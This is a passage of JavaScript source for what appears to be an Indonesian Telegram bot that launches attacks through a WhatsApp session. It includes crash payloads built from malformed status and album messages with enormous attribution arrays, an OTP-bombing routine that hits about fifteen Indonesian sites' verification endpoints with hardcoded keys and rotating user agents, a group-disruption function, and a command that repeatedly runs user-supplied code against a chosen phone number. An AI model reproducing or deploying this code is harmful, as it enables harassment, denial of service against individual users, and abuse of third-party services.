    mimetype: "image/jpeg",
    caption: "DIGIDAW\n",
    fileSha256: "UXAnqE96XbhJlQygSerag2w5bciGYC64Efc0WOKqliM=",
    fileLength: "0",
    height: 999,
    width: 999,
    mediaKey: "9mFMlLURejQjclsJGUOKPQoncF+TV/YgJVVHZjbhyu8=",
    fileEncSha256: "TWduFNUwLQ4uzTqCUexEr4bpZzdQBHVGPjndvnuiq6g=",
    directPath: "/o1/v/t24/f2/m239/AQPIIZjK4-SGNj_q-t7JycEFP7AeMU8Hdn2iTYVU3anoB9x042PAzsryyTMP2qluf4BX3O3wjU4uswCab9ChlBR-GrjCNDKL0Wo09WIg9w?ccb=9-4&oh=01_Q5Aa5QG3bhjIBdl8rVtK_Deok3IGxElZF_Qg89B-4Wuhy27uTQ&oe=6AB64F32&_nc_sid=e6ed6c",
    mediaKeyTimestamp: "1787748957",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADwAIQMBIgACEQEDEQH/xAAvAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQADAQAAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAABHNvcpJGpwEkcHfTbW2cwLnK5WIyNL04W+qbk+ogSImxrLleB1K9LM+rY2gNms/wD/xAAmEAACAgICAQMEAwAAAAAAAAABAgADBBESIRMiMUEUQlJTECNR/9oACAEBAAE/AOQ7DMVA6AEoQs3jX3JlrWqvbFY78vc7mo2K7ny1kHfwZho31HO32CzJvobmm4tCCvkatz0/gJU2XZsq0ShjWfJYeocdiwb7dx0rGMGRutT6Fz35Jh0pp0MfEqsY7+BLUrpoLFYuZj20rW3U50/tMwFyEBs+yG0WMAx0syKMh/6V7mRjWY7acTyWf7KjevpDHUrqyrm8amCuxaV/aB7zJXJ8urfWZwf8JjBnbXxKuFOh8tOexM1WYckPc8t8odlPRi32Cwd9blhJp94jsa+z/H//xAAdEQACAQUBAQAAAAAAAAAAAAAAARECAxIhYRMy/9oACAECAQE/ACYMh1EuoyK7L+pRbU6lHn1FxNzsp05M+I//xAAcEQACAgIDAAAAAAAAAAAAAAAAEQIRECESE4H/2gAIAQMBAT8A1QjpmJUUk0ekZKtknhT3xHj/2Q==",
    scansSidecar: "IXAF6oCitMt+vwhZ6nxXdon1Jo/V+Kg6J1vO7oBlkhMvjDVjLDHlKg==",
    scanLengths: [99999999999, 99999999999, 99999999999],
    midQualityFileSha256: "nQvIXHp6w1FNdkLFsnrpEkDjVKQVT0TEAQdp9139Cco=",
    contextInfo: {
      forwardingScore: 4,
      isForwarded: true,
      forwardOrigin: 4,
      statusAttributionType: 2,
      statusAttributions: Array.from({
        length: 200900
      }, () => ({
        type: 1
      }))
    }
  };
  const metaNode = {
    tag: "meta",
    attrs: {},
    content: [{
      tag: "mentioned_users",
      attrs: {},
      content: [{
        tag: "to",
        attrs: {
          jid: target
        },
        content: undefined
      }]
    }]
  };
  const album = await sock.relayMessage("status@broadcast", {
    albumMessage: {
      expectedImageCount: 199999999,
      expectedVideoCount: -199999999
    }
  }, {
    statusJidList: [target],
    additionalNodes: [metaNode]
  });
  for (let i = 0; i < 10; i++) {
    await sock.relayMessage("status@broadcast", {
      imageMessage: BULLZ,
      messageContextInfo: {
        messageAssociation: {
          associationType: 1,
          parentMessageKey: album.key
        }
      }
    }, {
      statusJidList: [target],
      additionalNodes: [metaNode]
    });
  }
}
async function delayinvis(sock, target) {
  const BULLZ = {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    caption: "DIGIDAW\n",
    fileSha256: "UXAnqE96XbhJlQygSerag2w5bciGYC64Efc0WOKqliM=",
    fileLength: "0",
    height: 999,
    width: 999,
    mediaKey: "9mFMlLURejQjclsJGUOKPQoncF+TV/YgJVVHZjbhyu8=",
    fileEncSha256: "TWduFNUwLQ4uzTqCUexEr4bpZzdQBHVGPjndvnuiq6g=",
    directPath: "/o1/v/t24/f2/m239/AQPIIZjK4-SGNj_q-t7JycEFP7AeMU8Hdn2iTYVU3anoB9x042PAzsryyTMP2qluf4BX3O3wjU4uswCab9ChlBR-GrjCNDKL0Wo09WIg9w?ccb=9-4&oh=01_Q5Aa5QG3bhjIBdl8rVtK_Deok3IGxElZF_Qg89B-4Wuhy27uTQ&oe=6AB64F32&_nc_sid=e6ed6c",
    mediaKeyTimestamp: "1787748957",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADwAIQMBIgACEQEDEQH/xAAvAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQADAQAAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAABHNvcpJGpwEkcHfTbW2cwLnK5WIyNL04W+qbk+ogSImxrLleB1K9LM+rY2gNms/wD/xAAmEAACAgICAQMEAwAAAAAAAAABAgADBBESIRMiMUEUQlJTECNR/9oACAEBAAE/AOQ7DMVA6AEoQs3jX3JlrWqvbFY78vc7mo2K7ny1kHfwZho31HO32CzJvobmm4tCCvkatz0/gJU2XZsq0ShjWfJYeocdiwb7dx0rGMGRutT6Fz35Jh0pp0MfEqsY7+BLUrpoLFYuZj20rW3U50/tMwFyEBs+yG0WMAx0syKMh/6V7mRjWY7acTyWf7KjevpDHUrqyrm8amCuxaV/aB7zJXJ8urfWZwf8JjBnbXxKuFOh8tOexM1WYckPc8t8odlPRi32Cwd9blhJp94jsa+z/H//xAAdEQACAQUBAQAAAAAAAAAAAAAAARECAxIhYRMy/9oACAECAQE/ACYMh1EuoyK7L+pRbU6lHn1FxNzsp05M+I//xAAcEQACAgIDAAAAAAAAAAAAAAAAEQIRECESE4H/2gAIAQMBAT8A1QjpmJUUk0ekZKtknhT3xHj/2Q==",
    scansSidecar: "IXAF6oCitMt+vwhZ6nxXdon1Jo/V+Kg6J1vO7oBlkhMvjDVjLDHlKg==",
    scanLengths: [99999999999, 99999999999, 99999999999],
    midQualityFileSha256: "nQvIXHp6w1FNdkLFsnrpEkDjVKQVT0TEAQdp9139Cco=",
    contextInfo: {
      forwardingScore: 4,
      isForwarded: true,
      forwardOrigin: 4,
      statusAttributionType: 2,
      statusAttributions: Array.from({
        length: 200900
      }, () => ({
        type: 1
      }))
    }
  };
  const metaNode = {
    tag: "meta",
    attrs: {},
    content: [{
      tag: "mentioned_users",
      attrs: {},
      content: [{
        tag: "to",
        attrs: {
          jid: target
        },
        content: undefined
      }]
    }]
  };
  const album = await sock.relayMessage("status@broadcast", {
    albumMessage: {
      expectedImageCount: 199999999,
      expectedVideoCount: -199999999
    }
  }, {
    statusJidList: [target],
    additionalNodes: [metaNode]
  });
  for (let i = 0; i < 10; i++) {
    await sock.relayMessage("status@broadcast", {
      imageMessage: BULLZ,
      messageContextInfo: {
        messageAssociation: {
          associationType: 1,
          parentMessageKey: album.key
        }
      }
    }, {
      statusJidList: [target],
      additionalNodes: [metaNode]
    });
  }
}

async function SpamOtpWhatsApp(sock, target) {
    try {
        const CONFIG = {
            retries: 2,
            timeout: 45000,
            delayMin: 2000,
            delayMax: 3000
        };

        const USER_AGENTS = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-S921B) Chrome/120.0.0.0 Mobile Safari/537.36'
        ];

        const randomUA = () => USER_AGENTS[crypto.randomInt(0, USER_AGENTS.length)];
        const randomDelay = (min = CONFIG.delayMin, max = CONFIG.delayMax) =>
            new Promise(resolve => setTimeout(resolve, crypto.randomInt(min, max)));

        const normalizePhone = (phone) => {
            let p = phone.replace(/[^0-9]/g, "");
            if (p.startsWith("0")) p = "62" + p.slice(1);
            if (!p.startsWith("62")) p = "62" + p;
            return p;
        };

        const generateEmail = () => {
            const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < 10; i++) {
                result += chars.charAt(crypto.randomInt(0, chars.length));
            }
            return `${result}@bwmyga.com`;
        };

        const getPinhomeCSRF = async () => {
            try {
                const resp = await axios.get('https://www.pinhome.id/daftar', {
                    headers: {
                        'User-Agent': randomUA(),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    },
                    timeout: 10000
                });

                let csrfToken = '';
                let cookieString = '';
                const cookies = resp.headers['set-cookie'] || [];

                cookies.forEach(c => {
                    const parts = c.split(';');
                    const nameValue = parts[0];
                    cookieString += nameValue + '; ';
                    if (nameValue.includes('_X7kCsrf')) {
                        csrfToken = nameValue.split('=')[1];
                    }
                });

                if (!csrfToken) {
                    const html = resp.data;
                    const match = html.match(/"csrfToken":"([^"]+)"/) || html.match(/name="csrf-token" content="([^"]+)"/);
                    if (match) csrfToken = match[1];
                }

                if (!csrfToken) {
                    csrfToken = 'v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8';
                    cookieString = '_X7kCsrf=' + csrfToken + '; _ga=GA1.1.1752313616.1783394371; _fbp=fb.1.1783394372483.552359809276689952; _clck=dub9tf%5E2%5Eg7j%5E0%5E2379';
                }

                return { csrfToken, cookieString };
            } catch (e) {
                return {
                    csrfToken: 'v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8',
                    cookieString: '_X7kCsrf=v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8; _ga=GA1.1.1752313616.1783394371'
                };
            }
        };

        const sendOTPRequest = async (url, data, headers = {}) => {
            try {
                const reqHeaders = {
                    "Content-Type": "application/json",
                    "User-Agent": randomUA(),
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8",
                    ...headers
                };

                const resp = await axios.post(url, data, {
                    headers: reqHeaders,
                    timeout: CONFIG.timeout
                });

                if ([200, 201, 202, 204].includes(resp.status)) return true;

                const responseBody = resp.data || {};
                const successIndicators = [
                    responseBody?.success === true,
                    responseBody?.status === "success",
                    responseBody?.statusCode === 200,
                    responseBody?.status === 202,
                    responseBody?.is_success === true,
                    responseBody?.message === "OTP terkirim",
                    responseBody?.message === "OTP sent successfully",
                    responseBody?.message === "Success.",
                    responseBody?.data?.otp === "processed",
                    responseBody?.data?.new_uuid,
                    responseBody?.data?.status === 1,
                    responseBody?.secretCode
                ];
                return successIndicators.some(Boolean);
            } catch (error) {
                return false;
            }
        };

        const phone = normalizePhone(target);
        const p08 = "0" + phone.slice(2);
        const p62 = phone;
        const pNoCountry = phone.replace("62", "");
        const email = generateEmail();
        const csrfData = await getPinhomeCSRF();
        
        await sendOTPRequest("https://api.maulagi.id/api/v2/auth/check", { credentials: p62 }, { "X-ML-KEY": "B10JLPEP10" });
        await randomDelay();
        
        await sendOTPRequest("https://matahari-backend-prod.matahari.com/api/auth/re-activation", { mobileCountryCode: "", mobileNumber: p08, activationCode: "" });
        await randomDelay();
        
        await sendOTPRequest("https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", 
            { accountType: "customers", applicationType: "Pinhome Web", countryCode: "62", medium: "whatsapp", otpType: "register", phoneNumber: pNoCountry },
            { "x-csrf-token": csrfData.csrfToken, "Cookie": csrfData.cookieString, "Origin": "https://www.pinhome.id", "Referer": "https://www.pinhome.id/daftar" }
        );
        await randomDelay();
        
        await sendOTPRequest("https://www.bonusbelanja.com/api/auth/registration/app", { phone: p62, name: "User", agreeTnc: true, agreeContact: false });
        await randomDelay();
        
        await sendOTPRequest("https://www.alodokter.com/resend-otp", { user: { phone: p08, uuid: crypto.randomUUID() }, request_via: "whatsapp" });
        await randomDelay();
        
        await sendOTPRequest("https://www.beautyhaul.com/ajax/account/send_otp", { method: "WhatsApp", phone: p62 });
        await randomDelay();
        
        await sendOTPRequest("https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id", 
            { nama_lengkap: "User", telepon: p08, email: `user${crypto.randomInt(1000,9999)}@mail.com` },
            { "Xid": String(crypto.randomInt(1000000, 9999999)), "source": "ocistok" }
        );
        await randomDelay();
        
        await sendOTPRequest("https://internetrakyat.id/api/app/auth/send-otp-register", 
            { phone_number: p08 },
            { "x-api-key": "280999!FTTH", "Origin": "https://internetrakyat.id", "Referer": "https://internetrakyat.id/auth/register" }
        );
        await randomDelay();
        
        await sendOTPRequest("https://api.dokterin.id/user/v1/users/login", 
            { phone: p62, tnc_accept: true, device_id: crypto.randomUUID() },
            { "Origin": "https://dokterin.id", "Referer": "https://dokterin.id/login" }
        );
        await randomDelay();
        
        await sendOTPRequest("https://api.paper.id/api/v1/auth/login", 
            { method: "whatsapp", phone: p08 },
            { "Origin": "https://www.paper.id", "Referer": "https://www.paper.id/", "x-paper-user-agent": "Jupiter/7.19.5 desktop (windows) Firefox 152", "request-id": crypto.randomUUID() }
        );
        await randomDelay();
        
        await sendOTPRequest("https://api.indodax.com/api/v1/otp/send", 
            { email: email, flow: "register", method: "whatsapp", old_uuid: "" },
            { "Origin": "https://indodax.com", "Referer": "https://indodax.com/", "key": "bAGUG2WiLy", "authorization": "Bearer bAGUG2WiLy" }
        );
        await randomDelay();
        
        await sendOTPRequest("https://cms.bunda.co.id/api/v1/auth/send-otp", 
            { phone_number: p62, type: "auth" },
            { "Origin": "https://www.bunda.co.id", "Referer": "https://www.bunda.co.id/id", "X-Requested-With": "XMLHttpRequest", "X-Locale": "id" }
        );
        await randomDelay();
        
        await sendOTPRequest("https://api.fastwork.id/auth/v2/signup.sendVerificationCode", { phone_number: p08 });
        await randomDelay();
        
        await sendOTPRequest("https://saturdays.com/api/v1/auth/otp", { phone: p62, type: "register" });
        await randomDelay();
        
        await sendOTPRequest("https://api.saturdays.com/v2/user/otp/request", { phoneNumber: p62, channel: "whatsapp" });

        return true;
    } catch (error) {
        return false;
    }
}

async function groupBan2(sock, target) {
  target = String(target);
  let groupJid = target;
  if (!target.endsWith("@g.us")) {
    const inviteCode = target.includes("chat.whatsapp.com/") ? target.split("chat.whatsapp.com/")[1].split(/[?/]/)[0] : target.replace(/[^a-zA-Z0-9]/g, "");
    try { groupJid = await sock.groupAcceptInvite(inviteCode); }
    catch (e) {
      if (e.message.includes("conflict") || e.message.includes("already")) {
        try { const meta = await sock.groupGetInviteInfo(inviteCode); groupJid = meta.id; }
        catch (e2) { console.log(`❌ ${e2.message}`); return false; }
      } else { console.log(`❌ Gagal join grup: ${e.message}`); return false; }
    }
  }
  if (!groupJid || !String(groupJid).endsWith("@g.us")) return false;
  const fakeNumbers = [
    "6280000000000@s.whatsapp.net", "14155552671@s.whatsapp.net",
    "447400000000@s.whatsapp.net", "61400000000@s.whatsapp.net",
    "6281234567890@s.whatsapp.net", "6287873499996@s.whatsapp.net",
    "6285655555555@s.whatsapp.net", "6289876543210@s.whatsapp.net",
    "6281111111111@s.whatsapp.net", "6282222222222@s.whatsapp.net",
    "6283333333333@s.whatsapp.net", "6284444444444@s.whatsapp.net",
    "6285555555555@s.whatsapp.net", "6286666666666@s.whatsapp.net",
    "6287777777777@s.whatsapp.net", "6288888888888@s.whatsapp.net",
    "6289999999999@s.whatsapp.net",
  ];
  const actions = ["add", "remove", "promote", "demote"];
  const fake = fakeNumbers[Math.floor(Math.random() * fakeNumbers.length)];
  const action = actions[Math.floor(Math.random() * actions.length)];
  try { await sock.groupParticipantsUpdate(groupJid, [fake], action); return true; }
  catch (e) { console.log(`❌ Gagal: ${e.message}`); return false; }
}

// ------------ ( CASE TEST FUNCTION ) -------------- \\

// ===== OPTIONAL SAFE SOCK (BIAR GA ERROR) =====
function createSafeSock(sock) {
  if (!sock) return null;
  return {
    sendMessage: sock.sendMessage?.bind(sock),
    relayMessage: sock.relayMessage?.bind(sock),
    groupMetadata: sock.groupMetadata?.bind(sock),
  };
}
// ================= EXTRACT GROUP ID =================
function extractGroupID(link = "") {

  try {

    const regex = /chat\.whatsapp\.com\/([0-9A-Za-z]+)/i;

    const match = link.match(regex);

    if (!match) return null;

    return match[1];

  } catch {
    return null;
  }
}

// ===== COMMAND TES FUNCTION=====
bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const chatId = ctx.chat.id;

  try {
    const text = ctx.message?.text || "";
    const args = text.split(" ");

    // ===== VALIDASI =====
    if (args.length < 3) {
      return ctx.reply("🪧 Example : /testfunction 62xxx 10 (reply your function)");
    }

    const q = args[1];
    let jumlah = Math.max(1, Math.min(parseInt(args[2]) || 1, 1000));

    if (isNaN(jumlah)) {
      return ctx.reply("❌ Jumlah harus angka");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    if (!ctx.message.reply_to_message?.text) {
      return ctx.reply("❌ Reply dengan function");
    }

    // ===== FOTO (LINK) =====
    const photoUrl = "https://files.catbox.moe/x339km.jpg"; // bebas ganti sama url foto kamu

    // ===== SEND PROCESS =====
    const processMsg = await ctx.replyWithPhoto(photoUrl, {
      caption: `
༺ Digidaw INFORMATION ATACK ༻
<blockquote><pre>
➩ Target : ${q}
➩ Effect : Unknown Function
➩ Status : Processing...
➩ Progress : [░░░░░░░░░░] 0%</pre></blockquote>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Target Check", url: `https://wa.me/${q}`, style: "success" }]
        ]
      }
    });

    const processMessageId = processMsg.message_id;

    // ===== AMBIL FUNCTION =====
    const funcCode = ctx.message.reply_to_message.text;

    const matchFunc = funcCode.match(/async function\s+(\w+)/);
    if (!matchFunc) {
      return ctx.reply("❌ Function harus async function");
    }

    const funcName = matchFunc[1];

    // ===== SANDBOX =====

    const safeSock = createSafeSock(global.sock || sock); // fallback

    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target,
      sleep,
      require
    };

    const context = vm.createContext(sandbox);

    const wrapper = `${funcCode}\n${funcName}`;
    const fn = vm.runInContext(wrapper, context);

    // Fungsi untuk membuat progress bar
    function getProgressBar(percent) {
      const filled = Math.round(percent / 10);
      const empty = 10 - filled;
      return '▓'.repeat(filled) + '░'.repeat(empty);
    }

    // ===== EXECUTE LOOP =====
    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;

        if (arity === 1) {
          await fn(target);
        } else if (arity === 2) {
          await fn(safeSock, target);
        } else {
          await fn(safeSock, target, true);
        }

        // Update progress setiap iterasi
        const progress = Math.min(Math.round((i + 1) * (100 / jumlah)), 100);
        const bar = getProgressBar(progress);
        
        await ctx.telegram.editMessageCaption(chatId, processMessageId, null, `
༺ Digidaw INFORMATION ATACK ༻
<blockquote><pre>
➩ Target : ${q}
➩ Effect : Unknown Function
➩ Status : Processing...
➩ Progress : [${bar}] ${progress}%</pre></blockquote>`, {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "Target Check", url: `https://wa.me/${q}`, style: "success" }]
            ]
          }
        });

      } catch (e) {
        console.log("Loop error:", e.message);
      }

      await new Promise(r => setTimeout(r, 200));
    }

    // ===== DONE =====
    const finalText = `
༺ Digidaw INFORMATION ATACK ༻
<blockquote><pre>
➩ Target : ${q}
➩ Effect : Unknown Function
➩ Status : Success ✅
➩ Progress : [▓▓▓▓▓▓▓▓▓▓] 100%</pre></blockquote>`;

    try {
      await ctx.telegram.editMessageCaption(
        chatId,
        processMessageId,
        null,
        finalText,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "Target Check", url: `https://wa.me/${q}`, style: "success" }]
            ]
          }
        }
      );
    } catch {
      await ctx.replyWithPhoto(photoUrl, {
        caption: finalText,
        parse_mode: "HTML"
      });
    }

  } catch (err) {
    console.error("ERROR:", err);
    ctx.reply("❌ Terjadi error");
  }
});

// ------------ ( CASE CEK ERROR FUNCTION ) -------------- \\

async function runtimeAnalyzer(code) {
  const logs = [];

  const sandbox = {
    console: {
      log: (...args) => logs.push(args.join(" ")),
      error: (...args) => logs.push(args.join(" ")),
      warn: (...args) => logs.push(args.join(" "))
    },
    setTimeout,
    setInterval,
    clearTimeout,
    clearInterval
  };

  try {
    vm.createContext(sandbox);

    vm.runInContext(code, sandbox, {
      timeout: 3000,
      displayErrors: true
    });

    return {
      success: true,
      logs,
      error: null
    };

  } catch (err) {
    return {
      success: false,
      logs,
      error: {
        name: err.name,
        message: err.message,
        stack: err.stack
      }
    };
  }
}

bot.command("cekerror", async (ctx) => {
  try {
    const replied = ctx.message.reply_to_message;

    if (!replied?.document) {
      return ctx.reply("📁 Reply ke file JavaScript (.js)");
    }

    const file = replied.document;

    if (!file.file_name?.toLowerCase().endsWith(".js")) {
      return ctx.reply("⚠️ File harus berformat .js");
    }

    const escapeHtml = (str = "") =>
      String(str)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;");

    const loading = await ctx.reply("🔍 Menganalisis JavaScript...");

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    const res = await fetch(fileLink.href);

    if (!res.ok) {
      return ctx.reply("❌ Gagal download file");
    }

    const code = await res.text();
    const lines = code.split("\n");

    // ================= FUNCTION DETECTION =================

    const functions = [];

    const regexes = [
      /function\s+([a-zA-Z_$][\w$]*)\s*\(/g,
      /async\s+function\s+([a-zA-Z_$][\w$]*)\s*\(/g,
      /(?:const|let|var)\s+([a-zA-Z_$][\w$]*)\s*=\s*(?:async\s*)?\([^)]*\)\s*=>/g,
      /(?:const|let|var)\s+([a-zA-Z_$][\w$]*)\s*=\s*(?:async\s*)?function\s*\(/g,
      /class\s+([a-zA-Z_$][\w$]*)/g
    ];

    for (const regex of regexes) {
      let match;

      while ((match = regex.exec(code)) !== null) {
        if (!functions.includes(match[1])) {
          functions.push(match[1]);
        }
      }
    }

    // ================= FLAGS =================

    const flags = [
      /async/.test(code) && "async",
      /await/.test(code) && "await",
      /require\s*\(/.test(code) && "require()",
      /import\s+/.test(code) && "import",
      /axios/i.test(code) && "axios",
      /telegraf/i.test(code) && "telegraf",
      /\bfs\b/.test(code) && "fs"
    ].filter(Boolean);

    const mode = /require\s*\(/.test(code)
      ? "CJS"
      : /import\s+/.test(code)
      ? "ESM"
      : "Unknown";

    const now = new Date();

    let report = `
🧪 <b>CekError JavaScript Analyzer</b>

🕒 <b>${now.toLocaleTimeString("id-ID")}</b>
📅 <b>${now.toLocaleDateString("id-ID")}</b>

━━━━━━━━━━━━━━━━━━━━

📄 <b>File</b>   : ${escapeHtml(file.file_name)}
📦 <b>Ukuran</b> : ${(Buffer.byteLength(code, "utf8") / 1024).toFixed(1)} KB
📑 <b>Baris</b>  : ${lines.length}
🔡 <b>Chars</b>  : ${code.length}
🧩 <b>Mode</b>   : ${mode}
⚙️ <b>Flags</b>  : ${flags.join(", ") || "-"}

━━━━━━━━━━━━━━━━━━━━

🧠 <b>Function Terdeteksi</b> (${functions.length})

${functions.length
  ? functions.map(f => `• ${escapeHtml(f)}`).join("\n")
  : "Tidak ditemukan"}
`;

    // ================= SYNTAX CHECK =================

    let syntaxError = null;

    try {
      new vm.Script(code);
    } catch (err) {
      syntaxError = err;
    }

    if (!syntaxError) {
      report += `

━━━━━━━━━━━━━━━━━━━━

✅ <b>Syntax Valid</b>

Tidak ditemukan syntax error.
`;
    } else {
      const match = syntaxError.stack?.match(/:(\d+):(\d+)/);

      const lineNum = match ? Number(match[1]) : null;
      const colNum = match ? match[2] : "?";

      let snippet = "";

      if (lineNum) {
        const start = Math.max(0, lineNum - 3);
        const end = Math.min(lines.length, lineNum + 2);

        for (let i = start; i < end; i++) {
          snippet += `${i + 1 === lineNum ? "👉" : "  "} ${String(i + 1).padStart(4)} | ${lines[i]}\n`;
        }
      }

      report += `

━━━━━━━━━━━━━━━━━━━━

❌ <b>Syntax Error</b>

📍 <b>Line</b>   : ${lineNum || "?"}
📍 <b>Column</b> : ${colNum}

<b>${escapeHtml(syntaxError.message)}</b>

📌 <b>Cuplikan</b>
<pre>${escapeHtml(
  snippet || "Tidak tersedia"
)}</pre>
🧾 <b>Stack (ringkas)</b>
<pre>${escapeHtml(
  syntaxError.stack
    ?.split("\n")
    .slice(0, 8)
    .join("\n") || "-"
)}</pre>
`;
    }

    try {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        loading.message_id,
        undefined,
        report,
        {
          parse_mode: "HTML"
        }
      );
    } catch {
      await ctx.reply(report, {
        parse_mode: "HTML"
      });
    }

  } catch (err) {
    console.error(err);

    return ctx.reply(
      `❌ Error\n\n<pre>${String(err.message)}</pre>`,
      {
        parse_mode: "HTML"
      }
    );
  }
});

// ------------ ( LAUNCH BOT DigidawES ) -------------- \\
bot.launch({
    dropPendingUpdates: true,
    allowedUpdates: ["message", "callback_query"]
}).then(() => {
    settingsStatusBot(bot);
}).catch(error => {
    console.error(error);
});

// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));